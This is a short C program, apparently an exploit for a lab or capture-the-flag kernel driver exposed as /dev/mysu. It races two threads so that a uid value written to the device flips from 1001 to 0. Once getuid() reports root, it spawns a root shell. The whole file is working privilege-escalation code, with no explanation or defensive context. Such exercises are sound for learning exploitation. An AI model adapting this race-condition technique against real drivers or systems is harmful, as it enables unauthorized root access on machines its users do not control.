#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int done = 0;

char payload[] = { 0xe9, 0x03, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 }; // localhost

void* change_uid_0(void* arg) {
    while (!done) {
        payload[0] = 0;
        payload[1] = 0;
    }
    return NULL;
}

int main() {
    pthread_t thread_uid_0;
    
    printf("[*] Opening /dev/mysu\n");

    int fd = open("/dev/mysu", O_RDWR);
    if (fd < 0) {
        perror("Failed to open /dev/mysu");
        return 1;
    }
	
	pthread_create(&thread_uid_0, NULL, change_uid_0, NULL);
    while (!done) {
        payload[0] = 0xe9; 
        payload[1] = 0x03; 
        write(fd, payload, sizeof(payload));
        if (getuid() == 0) {
            done = 1;
            printf("[*] Got root access... Spawning a shell\n\n");
            system("/bin/sh");
        }
    }

    close(fd);
    pthread_join(thread_uid_0, NULL);

    return 0;
}
